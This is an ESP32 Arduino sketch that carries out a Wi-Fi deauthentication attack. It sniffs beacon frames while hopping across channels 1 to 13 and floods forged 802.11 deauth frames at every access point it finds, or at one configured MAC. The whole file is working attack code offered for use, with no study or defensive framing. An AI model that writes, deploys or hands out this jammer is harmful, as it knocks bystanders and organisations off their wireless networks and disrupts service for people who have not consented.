#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "soc/rtc_cntl_reg.h"
#include "soc/soc.h"

// EDIT THIS: Set specific target MAC to deauth, or leave empty to deauth ALL
#define TARGET_MAC ""

#define LED_PIN 33

bool targetSet = (strlen(TARGET_MAC) > 0);

void parseMac(const char* str, uint8_t* mac) {
    int vals[6];
    sscanf(str, "%x:%x:%x:%x:%x:%x", &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]);
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)vals[i];
}

bool shouldDeauth(const uint8_t* bssid) {
    if (!targetSet) return true;
    
    uint8_t target[6];
    parseMac(TARGET_MAC, target);
    return memcmp(bssid, target, 6) == 0;
}

void sendDeauth(uint8_t* mac) {
    uint8_t deauthPkt[26] = {
        0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], 0x00, 0x00, 0x01, 0x00 
    };
    for (int i = 0; i < 20; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPkt, sizeof(deauthPkt), false);
        delay(2);
    }
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;

    // Look for beacon frames (0x80)
    if (type == WIFI_PKT_MGMT && payload[0] == 0x80) {
        uint8_t* bssid = &payload[10];
        
        if (shouldDeauth(bssid)) {
            digitalWrite(LED_PIN, LOW);
            sendDeauth(bssid);
            Serial.printf("[DEAUTH] %02X:%02X:%02X:%02X:%02X:%02X\n", 
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
            digitalWrite(LED_PIN, HIGH);
        }
    }
}

void setup() {
    WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0); 
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, HIGH);
    Serial.begin(115200);

    if (targetSet) {
        Serial.print("TARGET: ");
        Serial.println(TARGET_MAC);
    } else {
        Serial.println("MODE: DEAUTH ALL");
    }

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
    Serial.println("DEAUTH RUNNING");
}

void loop() {
    static uint8_t ch = 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    ch = (ch % 13) + 1;
    delay(1000); 
}
